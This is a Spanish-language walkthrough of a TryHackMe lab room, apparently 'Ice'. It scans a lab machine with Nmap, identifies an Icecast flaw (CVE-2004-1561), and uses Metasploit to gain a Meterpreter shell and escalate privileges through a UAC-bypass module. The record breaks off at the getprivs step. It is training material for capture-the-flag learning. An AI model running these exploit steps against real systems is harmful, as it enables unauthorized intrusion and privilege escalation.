10.10.252.236

# 1) Reconocimiento

## a) Ejecute un análisis en nuestra máquina de destino. Recomiendo usar un conjunto de análisis SYN para analizar todos los puertos de la máquina. El comando de análisis se proporcionará como una pista, sin embargo, se recomienda completar la sala " Nmap " antes de esta sala.

Hacemos un escaneo de puertos con Nmap, usando -sS para que el escaneo sea SYN como nos piden, el comando quedaría así:

```
nmap -sS -sV -T4 -A 10.10.252.236
```

![](IMG/Pasted%20image%2020250228024642.png)

**Respuesta: No aplica.**
## b) Una vez que se complete el análisis, veremos varios puertos interesantes abiertos en esta máquina. Como habrás adivinado, el firewall se ha desactivado (y el servicio se ha apagado por completo), lo que deja muy poco para proteger esta máquina. Uno de los puertos más interesantes que está abierto es Microsoft Remote Desktop (MSRDP). ¿En qué puerto está abierto?

![](IMG/Pasted%20image%2020250228024719.png)

**Respuesta: 3389**

## c) ¿Qué servicio identificó nmap como ejecutándose en el puerto 8000? (Primera palabra de este servicio)

![](IMG/Pasted%20image%2020250228024843.png)

**Respuesta: Icecast**

## d) ¿Qué identifica Nmap como el nombre de host de la máquina? (En mayúsculas para la respuesta)

![](IMG/Pasted%20image%2020250228025021.png)

**Respuesta: DARK-PC**

# 2. Obtener acceso 

## a) Ahora que hemos identificado algunos servicios interesantes que se ejecutan en nuestra máquina de destino, investiguemos un poco sobre uno de los servicios más extraños identificados: Icecast. Icecast, o al menos esta versión que se ejecuta en nuestro objetivo, tiene muchos defectos y una vulnerabilidad de alto nivel con una puntuación de 7,5 (7,4 según el lugar donde se mire). ¿Cuál es la **puntuación de impacto** de esta vulnerabilidad? Utilice [https://www.cvedetails.com](https://www.cvedetails.com/)  para esta pregunta y la siguiente.

Accedemos a la pagina, buscamos Icecast y buscamos la vulnerabilidad con mas alto nivel y una puntuación de 7,5.

![](IMG/Pasted%20image%2020250228025939.png)

Accedemos a ella y vemos el score, que es 6.4.

![](IMG/Pasted%20image%2020250228030007.png)

**Respuesta: 6.4**

## b) ¿Cuál es el número CVE de esta vulnerabilidad? Tendrá el formato: CVE-0000-0000

Lo hemos visto antes (ya está en la captura anterior).

**Respuesta: CVE-2004-1561

## c) Ahora que hemos encontrado nuestra vulnerabilidad, busquemos nuestro exploit. Para esta sección de la sala, utilizaremos el módulo Metasploit asociado con este exploit. Sigamos adelante e iniciemos Metasploit con el comando `msfconsole`

Iniciamos metasploit, usando:

```
msfconsole
```

![](IMG/Pasted%20image%2020250228030311.png)

**Respuesta: No aplica.**

## d) Una vez iniciado Metasploit, busquemos el exploit de destino con el comando 'search icecast'. ¿Cuál es la ruta completa (que comienza con exploit) del módulo de exploit? Si no estás familiarizado con Metasploit, echa un vistazo al módulo [Metasploit](https://tryhackme.com/module/metasploit) .

Ejecutamos la busqueda del exploit con:

```
search icecast
```

![](IMG/Pasted%20image%2020250228030436.png)

**Respuesta: exploit/windows/http/icecast_header

## e) Seleccionemos este módulo para utilizarlo. Escriba el comando `use icecast` o `use 0` para seleccionar el resultado de nuestra búsqueda.

Usamos:

```
use icecast
use 0
```

![](IMG/Pasted%20image%2020250228030705.png)

**Respuesta: No aplica.**

## f) Después de seleccionar nuestro módulo, ahora tenemos que comprobar qué opciones tenemos que configurar. Ejecute el comando `show options`. ¿Cuál es la única configuración requerida que actualmente está en blanco?

Ejecutamos:

```
show options
```

![](IMG/Pasted%20image%2020250228030915.png)

**Respuesta: RHOSTS**

## g) Primero, verifiquemos que la opción LHOST esté configurada en nuestra IP tun0 (que se puede encontrar en la página [de acceso](https://tryhackme.com/access) ). Una vez hecho esto, configuremos esa última opción en nuestra IP de destino. Ahora que tenemos todo listo, ejecutemos nuestro exploit usando el comando `exploit`

La ip de LHOST no coincide con la ip de tun 0.

![](IMG/Pasted%20image%2020250228031108.png)

La cambiamos usando:

```
set LHOST 10.8.16.0
```

![](IMG/Pasted%20image%2020250228031209.png)

Verificamos.

![](IMG/Pasted%20image%2020250228031251.png)

Configuramos RHOSTS:

```
set RHOSTS 10.10.252.236
```

![](IMG/Pasted%20image%2020250228031601.png)

Y ejecutamos el exploit:

```
exploit
```

![](IMG/Pasted%20image%2020250228031526.png)

# 3. Escalar privilegios

## a) ¡Guau! ¡Hemos logrado afianzarnos en nuestra máquina víctima! ¿Cómo se llama ls shell que tenemos ahora?

![](IMG/Pasted%20image%2020250228031807.png)

**Respuesta: Meterpreter**

## b) ¿Qué usuario estaba ejecutando ese proceso de Icecast? Los comandos utilizados en esta pregunta y en las siguientes se toman directamente del módulo ' [Metasploit](https://tryhackme.com/module/metasploit) '.

Para ver el usuario, ejecutamos:

```
getuid
```

![](IMG/Pasted%20image%2020250228032034.png)

**Respuesta: Dark**

## c) ¿Qué buid de Windows tiene el sistema?

Para ver esto, ejecutamos:

```
sysinfo
```

![](IMG/Pasted%20image%2020250228032251.png)

**Respuesta: 7601**

## d) Ahora que conocemos algunos de los detalles más precisos del sistema con el que estamos trabajando, comencemos a aumentar nuestros privilegios. Primero, ¿cuál es la arquitectura del proceso que estamos ejecutando?

Usando de nuevo:

```
sysinfo
```

![](IMG/Pasted%20image%2020250228032423.png)

**Respuesta: x64**

## e) Ahora que conocemos la arquitectura del proceso, realicemos un poco más de reconocimiento. Si bien esto no funciona muy bien en máquinas x64, ahora ejecutemos el siguiente comando `run post/multi/recon/local_exploit_suggester`. *Esto puede parecer que se bloquea mientras prueba los exploits y puede tardar varios minutos en completarse*

Ejecutamos lo que nos dicen:

```
run post/multi/recon/local_exploit_suggester
```

![](IMG/Pasted%20image%2020250228032623.png)

**Respuesta: No aplica.**

## f) Al ejecutar el sugerente de exploits local, se obtendrán varios resultados para posibles exploits de escalada. ¿Cuál es la ruta completa (que comienza con exploit/) para el primer exploit devuelto?

![](IMG/Pasted%20image%2020250228032758.png)

No nos da por buena la respuesta, se ve que hay algún fallo en el enunciado, probamos con la segunda opción.

![](IMG/Pasted%20image%2020250228032935.png)

Ahora, si, es el segundo.

**Respuesta: exploit/windows/local/bypassuac_eventvwr

## g) Ahora que tenemos un exploit en mente para elevar nuestros privilegios, pongamos en segundo plano nuestra sesión actual usando el comando `background` o `CTRL + z`. Tome nota del número de sesión que tenemos, probablemente será 1 en este caso. Podemos enumerar todas nuestras sesiones activas usando el comando `sessions` cuando estemos fuera del shell de meterpreter.

Ejecutamos:

```
Control + Z
sessions
```

![](IMG/Pasted%20image%2020250228033208.png)

Vemos que es la sesión 1.

**Respuesta: No aplica.**

## h) Continúe y seleccione nuestro exploit local encontrado anteriormente para usarlo usando el comando `use FULL_PATH_FOR_EXPLOIT`

Ejecutamos:

```
use exploit/windows/local/bypassuac_eventvwr
```

![](IMG/Pasted%20image%2020250228033414.png)

**Respuesta: No aplica.**

## i) Los exploits locales requieren que se seleccione una sesión (algo que podemos verificar con el comando `show options`), configúrelo ahora usando el comando `set session SESSION_NUMBER`

Ejecutamos:

```
set session 1
```

![](IMG/Pasted%20image%2020250228033610.png)

**Respuesta: No aplica.**

## j) Ahora que hemos establecido nuestro número de sesión, se mostrarán más opciones en el menú de opciones. Tendremos que configurar una más, ya que la IP de nuestro receptor no es correcta. ¿Cómo se llama esta opción?

Ejecutamos:

```
show options
```

![](IMG/Pasted%20image%2020250228033801.png)

**Respuesta: LHOST**

## k) Establezca esta opción ahora. Es posible que tenga que comprobar su IP en la red TryHackMe mediante el comando `ip addr`

Ejecutamos:

```
set LHOST 10.8.16.0
```

![](IMG/Pasted%20image%2020250228033957.png)

**Respuesta: No aplica**

## l) Una vez que hayamos configurado esta última opción, ahora podemos ejecutar nuestro exploit de escalada de privilegios. Ejecútelo ahora con el comando `run`. Tenga en cuenta que esto puede requerir varios intentos y es posible que deba reiniciar el equipo y explotar el servicio en caso de que esto falle.

Ejecutamos:

```
run
```

![](IMG/Pasted%20image%2020250228034153.png)

**Respuesta: No aplica**

## m) Una vez finalizada la escalada de privilegios, se abrirá una nueva sesión. Interactúe con ella ahora mediante el comando `sessions SESSION_NUMBER`

Se ha abierto la sesion 2 como vemos en la captura anterior, la seleccionamos usando:

```
sessions 2
```

![](IMG/Pasted%20image%2020250228034337.png)

**Respuesta: No aplica.**

## n) Ahora podemos verificar que hemos ampliado los permisos mediante el comando `getprivs`. ¿Qué permiso de la lista nos permite tomar propiedad de los archivos?

Ejecutamos:

```
getprivs
```





















